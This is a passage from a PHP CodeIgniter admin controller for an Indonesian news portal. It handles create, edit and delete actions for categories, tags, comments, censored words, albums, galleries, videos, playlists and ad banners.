            $id = array('id_berita' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
		$this->model_app->delete('berita',$id);
		redirect($this->uri->segment(1).'/listberita');
	}

    function delete_listopini(){
        cek_session_akses('listberita',$this->session->id_session);
        if ($this->session->level=='admin'){
    		$id = array('id_berita' => $this->uri->segment(3));
        }else{
            $id = array('id_berita' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
		$this->model_app->delete('berita',$id);
		redirect($this->uri->segment(1).'/listopini');
	}


	// Controller Modul Kategori Berita

	function kategoriberita(){
		cek_session_akses('kategoriberita',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('kategori','id_kategori','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('kategori',array('username'=>$this->session->username),'id_kategori','DESC');
        }
		$this->template->load('administrator/template','administrator/mod_kategori/view_kategori',$data);
	}

	function tambah_kategoriberita(){
		cek_session_akses('kategoriberita',$this->session->id_session);
		if (isset($_POST['submit'])){
			$data = array('nama_kategori'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'kategori_seo'=>seo_title($this->input->post('a')),
                        'aktif'=>$this->db->escape_str($this->input->post('b')),
                        'sidebar'=>$this->db->escape_str($this->input->post('c')));
			$this->model_app->insert('kategori',$data);
			redirect($this->uri->segment(1).'/kategoriberita');
		}else{
			$this->template->load('administrator/template','administrator/mod_kategori/view_kategori_tambah');
		}
	}

	function edit_kategoriberita(){
		cek_session_akses('kategoriberita',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$data = array('nama_kategori'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'kategori_seo'=>seo_title($this->input->post('a')),
                        'aktif'=>$this->db->escape_str($this->input->post('b')),
                        'sidebar'=>$this->db->escape_str($this->input->post('c')));
			$where = array('id_kategori' => $this->input->post('id'));
			$this->model_app->update('kategori', $data, $where);
			redirect($this->uri->segment(1).'/kategoriberita');
		}else{
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('kategori', array('id_kategori' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('kategori', array('id_kategori' => $id, 'username' => $this->session->username))->row_array();
            }
			$data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_kategori/view_kategori_edit',$data);
		}
	}

	function delete_kategoriberita(){
		cek_session_akses('kategoriberita',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_kategori' => $this->uri->segment(3));
        }else{
            $id = array('id_kategori' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
		$this->model_app->delete('kategori',$id);
		redirect($this->uri->segment(1).'/kategoriberita');
	}
    
    // Controller Modul Kategori Berita

	function subscribe(){
		cek_session_akses('subscribe',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_subscribe','id_subscribe','DESC');
		$this->template->load('administrator/template','administrator/mod_subscribe/view',$data);
	}
	
	function delete_subscribe(){
		cek_session_akses('subscribe',$this->session->id_session);
        $id = array('id_subscribe' => $this->uri->segment(3));
		$this->model_app->delete('rb_subscribe',$id);
		redirect($this->uri->segment(1).'/subscribe');
	}

	// Controller Modul Tag Berita

	function tagberita(){
		cek_session_akses('tagberita',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('tag','id_tag','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('tag',array('username'=>$this->session->username),'id_tag','DESC');
        }
		$this->template->load('administrator/template','administrator/mod_tag/view_tag',$data);
	}

	function tambah_tagberita(){
		cek_session_akses('tagberita',$this->session->id_session);
		if (isset($_POST['submit'])){
			$data = array('nama_tag'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'tag_seo'=>seo_title($this->input->post('a')),
                        'count'=>'0');
			$this->model_app->insert('tag',$data);	
			redirect($this->uri->segment(1).'/tagberita');
		}else{
			$this->template->load('administrator/template','administrator/mod_tag/view_tag_tambah');
		}
	}

	function edit_tagberita(){
		cek_session_akses('tagberita',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$data = array('nama_tag'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'tag_seo'=>seo_title($this->input->post('a')));
			$where = array('id_tag' => $this->input->post('id'));
			$this->model_app->update('tag', $data, $where);
			redirect($this->uri->segment(1).'/tagberita');
		}else{
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('tag', array('id_tag' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('tag', array('id_tag' => $id, 'username' => $this->session->username))->row_array();
            }
			$data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_tag/view_tag_edit',$data);
		}
	}

	function delete_tagberita(){
        cek_session_akses('tagberita',$this->session->id_session);
		if ($this->session->level=='admin'){
            $id = array('id_tag' => $this->uri->segment(3));
        }else{
            $id = array('id_tag' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
		$this->model_app->delete('tag',$id);
		redirect($this->uri->segment(1).'/tagberita');
	}



	// Controller Modul Komentar Berita

	function komentarberita(){
		cek_session_akses('komentarberita',$this->session->id_session);
		$data['record'] = $this->model_app->view_ordering('komentar','id_komentar','DESC');
		$this->template->load('administrator/template','administrator/mod_komentar/view_komentar',$data);
	}

	function edit_komentarberita(){
		cek_session_akses('komentarberita',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$data = array('nama_komentar'=>$this->input->post('a'),
                        'url'=>$this->input->post('b'),
                        'isi_komentar'=>$this->input->post('c'),
                        'aktif'=>$this->input->post('d'),
                        'email'=>$this->input->post('e'));
			$where = array('id_komentar' => $this->input->post('id'));
			$this->model_app->update('komentar', $data, $where);
			redirect($this->uri->segment(1).'/komentarberita');
		}else{
			$proses = $this->model_app->edit('komentar', array('id_komentar' => $id))->row_array();
			$data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_komentar/view_komentar_edit',$data);
		}
	}

	function delete_komentarberita(){
        cek_session_akses('komentarberita',$this->session->id_session);
		$id = array('id_komentar' => $this->uri->segment(3));
		$this->model_app->delete('komentar',$id);
		redirect($this->uri->segment(1).'/komentarberita');
	}


	// Controller Modul Sensor Komentar Berita

	function sensorkomentar(){
		cek_session_akses('sensorkomentar',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('katajelek','id_jelek','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('katajelek',array('username'=>$this->session->username),'id_jelek','DESC');
        }
		$this->template->load('administrator/template','administrator/mod_sensorkomentar/view_sensorkomentar',$data);
	}

	function tambah_sensorkomentar(){
		cek_session_akses('sensorkomentar',$this->session->id_session);
		if (isset($_POST['submit'])){
			$data = array('kata'=>$this->input->post('a'),
                        'username'=>$this->session->username,
                        'ganti'=>$this->input->post('b'));
			$this->model_app->insert('katajelek',$data);	
			redirect($this->uri->segment(1).'/sensorkomentar');
		}else{
			$this->template->load('administrator/template','administrator/mod_sensorkomentar/view_sensorkomentar_tambah');
		}
	}

	function edit_sensorkomentar(){
		cek_session_akses('sensorkomentar',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$this->model_berita->tag_berita_update();
			$data = array('kata'=>$this->input->post('a'),
                        'username'=>$this->session->username,
                        'ganti'=>$this->input->post('b'));
			$where = array('id_jelek' => $this->input->post('id'));
			$this->model_app->update('katajelek', $data, $where);
			redirect($this->uri->segment(1).'/sensorkomentar');
		}else{
            if ($this->session->level=='admin'){
                 $proses = $this->model_app->edit('katajelek', array('id_jelek' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('katajelek', array('id_jelek' => $id, 'username' => $this->session->username))->row_array();
            }
			$data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/mod_sensorkomentar/view_sensorkomentar_edit',$data);
		}
	}

	function delete_sensorkomentar(){
        cek_session_akses('sensorkomentar',$this->session->id_session);
		if ($this->session->level=='admin'){
            $id = array('id_jelek' => $this->uri->segment(3));
        }else{
            $id = array('id_jelek' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
		$this->model_app->delete('katajelek',$id);
		redirect($this->uri->segment(1).'/sensorkomentar');
	}


    // Controller Modul Album

    function album(){
        cek_session_akses('album',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('album','id_album','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('album',array('username'=>$this->session->username),'id_album','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_album/view_album',$data);
    }

    function tambah_album(){
        cek_session_akses('album',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_album/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('jdl_album'=>$this->input->post('a'),
                            'album_seo'=>seo_title($this->input->post('a')),
                            'keterangan'=>$this->input->post('b'),
                            'opsi'=>$this->input->post('e'),
                            'aktif'=>'Y',
                            'hits_album'=>'0',
                            'tgl_posting'=>date('Y-m-d'),
                            'jam'=>date('H:i:s'),
                            'hari'=>hari_ini(date('w')),
                            'username'=>$this->session->username);
            }else{
                $data = array('jdl_album'=>$this->input->post('a'),
                            'album_seo'=>seo_title($this->input->post('a')),
                            'keterangan'=>$this->input->post('b'),
                            'opsi'=>$this->input->post('e'),
                            'gbr_album'=>$hasil['file_name'],
                            'aktif'=>'Y',
                            'hits_album'=>'0',
                            'tgl_posting'=>date('Y-m-d'),
                            'jam'=>date('H:i:s'),
                            'hari'=>hari_ini(date('w')),
                            'username'=>$this->session->username);
            }

            $this->model_app->insert('album',$data);  
            redirect($this->uri->segment(1).'/album');
        }else{
            $this->template->load('administrator/template','administrator/mod_album/view_album_tambah');
        }
    }

    function edit_album(){
        cek_session_akses('album',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_album/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('jdl_album'=>$this->input->post('a'),
                            'album_seo'=>seo_title($this->input->post('a')),
                            'opsi'=>$this->input->post('e'),
                            'keterangan'=>$this->input->post('b'),
                            'aktif'=>$this->input->post('d'));
            }else{
                $data = array('jdl_album'=>$this->input->post('a'),
                            'album_seo'=>seo_title($this->input->post('a')),
                            'keterangan'=>$this->input->post('b'),
                            'opsi'=>$this->input->post('e'),
                            'gbr_album'=>$hasil['file_name'],
                            'aktif'=>$this->input->post('d'));
            }
            $where = array('id_album' => $this->input->post('id'));
            $this->model_app->update('album', $data, $where);
            redirect($this->uri->segment(1).'/album');
        }else{
            if ($this->session->level=='admin'){
                $proses = $this->model_app->edit('album', array('id_album' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('album', array('id_album' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_album/view_album_edit',$data);
        }
    }

    function delete_album(){
        cek_session_akses('album',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_album' => $this->uri->segment(3));
        }else{
            $id = array('id_album' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('album',$id);
        redirect($this->uri->segment(1).'/album');
    }


    // Controller Modul Gallery

    function gallery(){
        cek_session_akses('gallery',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_join_one('gallery','album','id_album','id_gallery','DESC');
        }else{
            $data['record'] = $this->model_app->view_join_where('gallery','album','id_album',array('gallery.username'=>$this->session->username),'id_gallery','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_gallery/view_gallery',$data);
    }

    function tambah_gallery(){
        cek_session_akses('gallery',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_galeri/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('d');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('id_album'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_gallery'=>$this->input->post('b'),
                            'gallery_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'));
            }else{
                $data = array('id_album'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_gallery'=>$this->input->post('b'),
                            'gallery_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'),
                            'gbr_gallery'=>$hasil['file_name']);
            }
            $this->model_app->insert('gallery',$data);  
            redirect($this->uri->segment(1).'/gallery');
        }else{
            $data['record'] = $this->model_app->view_ordering('album','id_album','DESC');
            $this->template->load('administrator/template','administrator/mod_gallery/view_gallery_tambah',$data);
        }
    }

    function edit_gallery(){
        cek_session_akses('gallery',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_galeri/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('d');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('id_album'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_gallery'=>$this->input->post('b'),
                            'gallery_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'));
            }else{
                $data = array('id_album'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_gallery'=>$this->input->post('b'),
                            'gallery_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'),
                            'gbr_gallery'=>$hasil['file_name']);
            }
            $where = array('id_gallery' => $this->input->post('id'));
            $this->model_app->update('gallery', $data, $where);
            redirect($this->uri->segment(1).'/gallery');
        }else{
            $record = $this->model_app->view_ordering('album','id_album','DESC');
            if ($this->session->level=='admin'){
                $proses = $this->model_app->edit('gallery', array('id_gallery' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('gallery', array('id_gallery' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses,'record' => $record);
            $this->template->load('administrator/template','administrator/mod_gallery/view_gallery_edit',$data);
        }
    }

    function delete_gallery(){
        cek_session_akses('gallery',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_gallery' => $this->uri->segment(3));
        }else{
            $id = array('id_gallery' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('gallery',$id);
        redirect($this->uri->segment(1).'/gallery');
    }


    // Controller Modul Video

    function video(){
        cek_session_akses('video',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_join_one('video','playlist','id_playlist','id_video','DESC');
        }else{
            $data['record'] = $this->model_app->view_join_where('video','playlist','id_playlist',array('video.username'=>$this->session->username),'id_video','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_video/view_video',$data);
    }

    function tambah_video(){
        cek_session_akses('video',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_video/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('d');
            $hasil=$this->upload->data();

            if ($this->input->post('f')!=''){
                $tag_seo = $this->input->post('f');
                $tag=implode(',',$tag_seo);
            }else{
                $tag = '';
            }
            
            if ($hasil['file_name']==''){
                $data = array('id_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_video'=>$this->input->post('b'),
                            'video_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'),
                            'video'=>'',
                            'youtube'=>$this->input->post('e'),
                            'dilihat'=>'0',
                            'hari'=>hari_ini(date('w')),
                            'tanggal'=>date('Y-m-d'),
                            'jam'=>date('H:i:s'),
                            'tagvid'=>$tag);
            }else{
                $data = array('id_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_video'=>$this->input->post('b'),
                            'video_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'),
                            'gbr_video'=>$hasil['file_name'],
                            'video'=>'',
                            'youtube'=>$this->input->post('e'),
                            'dilihat'=>'0',
                            'hari'=>hari_ini(date('w')),
                            'tanggal'=>date('Y-m-d'),
                            'jam'=>date('H:i:s'),
                            'tagvid'=>$tag);
            }
            $this->model_app->insert('video',$data);  
            redirect($this->uri->segment(1).'/video');
        }else{
            $data['record'] = $this->model_app->view_ordering('playlist','id_playlist','DESC');
            $data['tag'] = $this->model_app->view_ordering('tagvid','id_tag','DESC');
            $this->template->load('administrator/template','administrator/mod_video/view_video_tambah',$data);
        }
    }

    function edit_video(){
        cek_session_akses('video',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_video/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('d');
            $hasil=$this->upload->data();

            if ($this->input->post('f')!=''){
                $tag_seo = $this->input->post('f');
                $tag=implode(',',$tag_seo);
            }else{
                $tag = '';
            }

            if ($hasil['file_name']==''){
                $data = array('id_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_video'=>$this->input->post('b'),
                            'video_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'),
                            'video'=>'',
                            'youtube'=>$this->input->post('e'),
                            'tagvid'=>$tag);
            }else{
                $data = array('id_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'jdl_video'=>$this->input->post('b'),
                            'video_seo'=>seo_title($this->input->post('b')),
                            'keterangan'=>$this->input->post('c'),
                            'gbr_video'=>$hasil['file_name'],
                            'video'=>'',
                            'youtube'=>$this->input->post('e'),
                            'tagvid'=>$tag);
            }

            $where = array('id_video' => $this->input->post('id'));
            $this->model_app->update('video', $data, $where);
            redirect($this->uri->segment(1).'/video');
        }else{
            $record = $this->model_app->view_ordering('playlist','id_playlist','DESC');
            $tag = $this->model_app->view_ordering('tagvid','id_tag','DESC');
            if ($this->session->level=='admin'){
                $proses = $this->model_app->edit('video', array('id_video' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('video', array('id_video' => $id, 'username' => $this->session->username))->row_array();
            }
            
            $data = array('rows' => $proses,'record' => $record, 'tag' => $tag);
            $this->template->load('administrator/template','administrator/mod_video/view_video_edit',$data);
        }
    }

    function delete_video(){
        cek_session_akses('video',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_video' => $this->uri->segment(3));
        }else{
            $id = array('id_video' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('video',$id);
        redirect($this->uri->segment(1).'/video');
    }


    // Controller Modul Playlist

    function playlist(){
        cek_session_akses('playlist',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('playlist','id_playlist','DESC');
        $this->template->load('administrator/template','administrator/mod_playlist/view_playlist',$data);
    }

    function tambah_playlist(){
        cek_session_akses('playlist',$this->session->id_session);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_playlist/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('b');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('jdl_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'playlist_seo'=>seo_title($this->input->post('a')),
                            'aktif'=>'Y');
            }else{
                $data = array('jdl_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'playlist_seo'=>seo_title($this->input->post('a')),
                            'gbr_playlist'=>$hasil['file_name'],
                            'aktif'=>'Y');
            }
            $this->model_app->insert('playlist',$data);  
            redirect($this->uri->segment(1).'/playlist');
        }else{
            $this->template->load('administrator/template','administrator/mod_playlist/view_playlist_tambah');
        }
    }

    function edit_playlist(){
        cek_session_akses('playlist',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/img_playlist/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('b');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('jdl_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'playlist_seo'=>seo_title($this->input->post('a')),
                            'aktif'=>$this->input->post('c'));
            }else{
                $data = array('jdl_playlist'=>$this->input->post('a'),
                            'username'=>$this->session->username,
                            'playlist_seo'=>seo_title($this->input->post('a')),
                            'gbr_playlist'=>$hasil['file_name'],
                            'aktif'=>$this->input->post('c'));
            }
            $where = array('id_playlist' => $this->input->post('id'));
            $this->model_app->update('playlist', $data, $where);
            redirect($this->uri->segment(1).'/playlist');
        }else{
            $proses = $this->model_app->edit('playlist', array('id_playlist' => $id))->row_array();
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_playlist/view_playlist_edit',$data);
        }
    }

    function delete_playlist(){
        cek_session_akses('playlist',$this->session->id_session);
        $id = array('id_playlist' => $this->uri->segment(3));
        $this->model_app->delete('playlist',$id);
        redirect($this->uri->segment(1).'/playlist');
    }


    // Controller Modul Tag Video

    function tagvideo(){
        cek_session_akses('tagvideo',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('tagvid','id_tag','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('tagvid',array('username'=>$this->session->username),'id_tag','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_tagvideo/view_tag',$data);
    }

    function tambah_tagvideo(){
        cek_session_akses('tagvideo',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('nama_tag'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'tag_seo'=>seo_title($this->input->post('a')),
                        'count'=>'0');
            $this->model_app->insert('tagvid',$data);  
            redirect($this->uri->segment(1).'/tagvideo');
        }else{
            $this->template->load('administrator/template','administrator/mod_tagvideo/view_tag_tambah');
        }
    }

    function edit_tagvideo(){
        cek_session_akses('tagvideo',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('nama_tag'=>$this->db->escape_str($this->input->post('a')),
                        'username'=>$this->session->username,
                        'tag_seo'=>seo_title($this->input->post('a')));
            $where = array('id_tag' => $this->input->post('id'));
            $this->model_app->update('tagvid', $data, $where);
            redirect($this->uri->segment(1).'/tagvideo');
        }else{
            if ($this->session->level=='admin'){
                $proses = $this->model_app->edit('tagvid', array('id_tag' => $id))->row_array();
            }else{
                $proses = $this->model_app->edit('tagvid', array('id_tag' => $id, 'username' => $this->session->username))->row_array();
            }
            
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_tagvideo/view_tag_edit',$data);
        }
    }

    function delete_tagvideo(){
        cek_session_akses('tagvideo',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_tag' => $this->uri->segment(3));
        }else{
            $id = array('id_tag' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('tagvid',$id);
        redirect($this->uri->segment(1).'/tagvideo');
    }


    // Controller Modul Komentar Video

    function komentarvideo(){
        cek_session_akses('komentarvideo',$this->session->id_session);
        $data['record'] = $this->model_app->view_join_one('komentarvid','video','id_video','id_komentar','DESC');
        $this->template->load('administrator/template','administrator/mod_komentarvideo/view_komentar',$data);
    }

    function edit_komentarvideo(){
        cek_session_akses('komentarvideo',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('nama_komentar'=>$this->input->post('a'),
                        'url'=>$this->input->post('b'),
                        'isi_komentar'=>$this->input->post('c'),
                        'aktif'=>$this->input->post('d'));
            $where = array('id_komentar' => $this->input->post('id'));
            $this->model_app->update('komentarvid', $data, $where);
            redirect($this->uri->segment(1).'/komentarvideo');
        }else{
            $proses = $this->model_app->edit('komentarvid', array('id_komentar' => $id))->row_array();
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_komentarvideo/view_komentar_edit',$data);
        }
    }

    function delete_komentarvideo(){
        cek_session_akses('komentarvideo',$this->session->id_session);
        $id = array('id_komentar' => $this->uri->segment(3));
        $this->model_app->delete('komentarvid',$id);
        redirect($this->uri->segment(1).'/komentarvideo');
    }

    // Controller Modul Iklan Atas

    function iklanatas(){
        cek_session_akses('iklanatas',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('iklanatas','id_iklanatas','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('iklanatas',array('username'=>$this->session->username),'id_iklanatas','DESC');
        }
        $this->template->load('administrator/template','administrator/mod_iklanatas/view_iklanatas',$data);
    }

    function tambah_iklanatas(){
        cek_session_akses('iklanatas',$this->session->id_session);
        if (isset($_POST['submit'])){
    $config['upload_path'] = 'asset/foto_iklanatas/';
    $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
    $config['max_size'] = '3000'; // kb
    $this->load->library('upload', $config);
    $this->upload->do_upload('c');
    $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'tgl_posting'=>date('Y-m-d'));
            }else{
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'tgl_posting'=>date('Y-m-d'));
            }
            $this->model_app->insert('iklanatas',$data);  
            redirect($this->uri->segment(1).'/iklanatas');
        }else{
            $this->template->load('administrator/template','administrator/mod_iklanatas/view_iklanatas_tambah');
        }
    }

    function edit_iklanatas(){
        cek_session_akses('iklanatas',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/foto_iklanatas/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->db->escape_str($this->input->post('f')),
                                'url'=>$this->input->post('b'),
                                'tgl_posting'=>date('Y-m-d'));
            }else{
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->db->escape_str($this->input->post('f')),
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'tgl_posting'=>date('Y-m-d'));
            }
            $where = array('id_iklanatas' => $this->input->post('id'));
            $this->model_app->update('iklanatas', $data, $where);
            redirect($this->uri->segment(1).'/edit_iklanatas/'.$this->input->post('id'));
        }else{
            if ($this->session->level=='admin'){
                $proses = $this->db->query("SELECT * FROM iklanatas ORDER BY id_iklanatas DESC LIMIT 1")->row_array();
            }else{
                $proses = $this->model_app->edit('iklanatas', array('id_iklanatas' => $id, 'username' => $this->session->username))->row_array();
            }
            $data = array('rows' => $proses);
            $this->template->load('administrator/template','administrator/mod_iklanatas/view_iklanatas_edit',$data);
        }
    }

    function delete_iklanatas(){
        cek_session_akses('iklanatas',$this->session->id_session);
        if ($this->session->level=='admin'){
            $id = array('id_iklanatas' => $this->uri->segment(3));
        }else{
            $id = array('id_iklanatas' => $this->uri->segment(3), 'username'=>$this->session->username);
        }
        $this->model_app->delete('iklanatas',$id);
        redirect($this->uri->segment(1).'/iklanatas');
    }


	// Controller Modul Iklan Home

	function iklanhome(){
		cek_session_akses('iklanhome',$this->session->id_session);
        if ($this->session->level=='admin'){
            $data['record'] = $this->model_app->view_ordering('iklantengah','id_iklantengah','DESC');
        }else{
            $data['record'] = $this->model_app->view_where_ordering('iklantengah',array('username'=>$this->session->username),'id_iklantengah','DESC');
        }
		$this->template->load('administrator/template','administrator/mod_iklanhome/view_iklanhome',$data);
	}

	function tambah_iklanhome(){
		cek_session_akses('iklanhome',$this->session->id_session);
		if (isset($_POST['submit'])){
    		$config['upload_path'] = 'asset/foto_iklantengah/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '3000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('c');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'tgl_posting'=>date('Y-m-d'));
            }else{
                $data = array('judul'=>$this->db->escape_str($this->input->post('a')),
                                'username'=>$this->session->username,
                                'url'=>$this->input->post('b'),
                                'gambar'=>$hasil['file_name'],
                                'tgl_posting'=>date('Y-m-d'));
            }
            $this->model_app->insert('iklantengah',$data);  
			redirect($this->uri->segment(1).'/iklanhome');
		}else{
			$this->template->load('administrator/template','administrator/mod_iklanhome/view_iklanhome_tambah');
		}
	}

	function edit_iklanhome(){
		cek_session_akses('iklanhome',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$config['upload_path'] = 'asset/foto_iklantengah/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '3000'; // kb
